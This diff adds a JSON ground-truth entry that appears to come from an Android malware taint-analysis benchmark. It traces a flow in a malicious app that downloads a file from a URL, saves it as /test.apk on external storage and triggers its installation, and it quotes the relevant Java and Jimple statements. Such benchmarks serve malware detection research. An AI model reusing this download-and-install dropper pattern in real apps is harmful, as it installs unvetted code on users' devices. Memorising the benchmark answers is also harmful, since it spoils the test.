@@ -1,0 +1,68 @@
+{
+  "fileName": "the_interview_movieshow.apk",
+  "day": "2019-04-11",
+  "findings": [
+    {
+      "source": {
+        "statement": "InputStream input = new BufferedInputStream(url.openStream(), 10240);",
+        "methodName": "public String doInBackground(String... f_url)",
+        "className": "com.movieshow.down.Badaccents.DownloadMusicfromInternet",
+        "lineNo": 164,
+        "targetName": "openStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r6.<java.net.URL: java.io.InputStream openStream()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "startActivity(intent);",
+        "methodName": "public void playMusic()",
+        "className": "com.movieshow.down.Badaccents",
+        "lineNo": 213,
+        "targetName": "startActivity",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r0.<com.movieshow.down.Badaccents: void startActivity(android.content.Intent)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int count = input.read(data);",
+          "methodName": "public String doInBackground(String... f_url)",
+          "className": "com.movieshow.down.Badaccents.DownloadMusicfromInternet",
+          "lineNo": 169,
+          "ID": 1
+        },
+        {
+          "statement": "output.write(data, 0, count);",
+          "methodName": "public String doInBackground(String... f_url)",
+          "className": "com.movieshow.down.Badaccents.DownloadMusicfromInternet",
+          "lineNo": 175,
+          "ID": 2
+        },
+        {
+          "statement": "intent.setDataAndType(Uri.fromFile(new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append(\"/test.apk\").toString())), \"application/vnd.android.package-archive\");",
+          "methodName": "public void playMusic()",
+          "className": "com.movieshow.down.Badaccents",
+          "lineNo": 212,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "interComponentCommunication": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow loads an apk file to external storage and installs this apk.",
+      "isNegative": false
+    }
+  ]
+}
